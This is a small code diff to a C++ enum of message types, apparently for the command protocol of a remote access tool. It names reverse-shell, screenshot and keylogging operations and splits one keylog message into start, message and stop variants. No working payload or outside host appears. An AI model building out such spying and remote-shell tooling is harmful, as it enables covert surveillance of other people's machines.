@@ -8,7 +8,9 @@ enum class MessageType : char
 	StartReverseShell,
 	ReverseShellMessage,
 	StopReverseShell,
-	KeyLog,
 	TakeScreenshot,
-	Screenshot
+	Screenshot,
+	StartKeyLog,
+	KeyLogMessage,
+	StopKeyLog
 };
